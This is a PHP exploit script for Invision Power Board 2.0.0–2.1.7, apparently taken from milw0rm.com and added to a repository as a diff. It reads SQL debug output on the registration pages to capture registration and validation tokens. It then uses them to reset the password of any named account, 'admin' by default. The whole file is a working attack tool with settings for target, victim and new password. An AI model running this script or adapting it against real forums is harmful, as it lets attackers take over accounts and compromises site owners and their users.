@@ -1,0 +1,96 @@
+<?php
+/*
+
+ Debug Mode password change vulnerability
+ Affects Invision Power Borard 2.0.0 to 2.1.7
+ by Rapigator
+ 
+ This works if:
+
+ "Debug Level" is set to 3
+ or
+ Enable SQL Debug Mode is turned on
+ 
+ In General Configuration of the forum software.
+
+*/
+
+// The forum's address up to and including 'index.php'
+$site = "http://localhost/forums/index.php";
+
+// An existing user's login name
+$name = "admin";
+
+// The new password(3-32 characters)
+$pass = "1234";
+
+// You can use a proxy...
+// $proxy = "1.2.3.4:8080";
+
+
+
+// -----------------------------
+$site .= "?";
+$suffix = "";
+$name = urlencode($name);
+$pass = urlencode($pass);
+$curl = curl_init($site.'act=Reg&CODE=10');
+curl_setopt($curl, CURLOPT_PROXY, $proxy);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_TIMEOUT, 10);
+$page = curl_exec($curl);
+curl_close($curl);
+if (preg_match('/<span class=\'green\'>INSERT<\/span> INTO <span class=\'purple\'>([\\w]*?)_reg_antispam<\/span> \\(regid,regcode,ip_address,ctime\\) VALUES\\(\'([\\w]{32}?)\',([\\d]*?),/', $page, $regs)) {
+	$prefix = $regs[1];
+	$regid = $regs[2];
+	$regcode = $regs[3];
+} else {
+	$suffix = "&debug=1";
+	$curl = curl_init($site.'act=Reg&CODE=10'.$suffix);
+	curl_setopt($curl, CURLOPT_PROXY, $proxy);
+	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($curl, CURLOPT_TIMEOUT, 10);
+	$page = curl_exec($curl);
+	curl_close($curl);
+	if (preg_match('/INSERT INTO ([\\w]*?)_reg_antispam \\(regid,regcode,ip_address,ctime\\) VALUES\\(\'([\\w]{32}?)\',([\\d]*?),/', $page, $regs)) {
+		$prefix = $regs[1];
+		$regid = $regs[2];
+		$regcode = $regs[3];
+	}
+}
+if (!isset($regid) || !isset($regcode)) {
+	echo "Error: Probably not vulnerable, or no forum found";
+	exit;
+}
+
+$curl = curl_init($site.$suffix);
+curl_setopt($curl, CURLOPT_PROXY, $proxy);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_POST, 1);
+curl_setopt($curl, CURLOPT_POSTFIELDS, "act=Reg&CODE=11&member_name={$name}&regid={$regid}&reg_code={$regcode}");
+curl_setopt($curl, CURLOPT_TIMEOUT, 10);
+$page = curl_exec($curl);
+curl_close($curl);
+if (preg_match('/<span class=\'green\'>INSERT<\/span> INTO <span class=\'purple\'>'.$prefix.'_validating<\/span> \\(vid,member_id,real_group,temp_group,entry_date,coppa_user,lost_pass,ip_address\\) VALUES\\(\'([\\w]{32}?)\',([\\d]{1,32}?),/', $page, $regs)) {
+	change_pass($regcode,$regid,$regs[1],$regs[2]);
+}
+if (preg_match('/INSERT INTO '.$prefix.'_validating \\(vid,member_id,real_group,temp_group,entry_date,coppa_user,lost_pass,ip_address\\) VALUES\\(\'([\\w]{32}?)\',([\\d]{1,32}?),/', $page, $regs)) {
+	change_pass($regcode,$regid,$regs[1],$regs[2]);
+}
+
+function change_pass($regcode,$regid,$vid,$userid) {
+	global $site, $proxy, $name, $pass;
+	$curl = curl_init($site.$suffix);
+	curl_setopt($curl, CURLOPT_PROXY, $proxy);
+	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($curl, CURLOPT_POST, 1);
+	curl_setopt($curl, CURLOPT_POSTFIELDS, "act=Reg&CODE=03&type=lostpass&uid={$userid}&aid={$vid}&regid={$regid}&reg_code={$regcode}&pass1={$pass}&pass2={$pass}");
+	curl_setopt($curl, CURLOPT_TIMEOUT, 10);
+	$page = curl_exec($curl);
+	curl_close($curl);
+	echo "Password Changed!";
+	exit;
+}
+?>
+
+# milw0rm.com [2006-11-01]
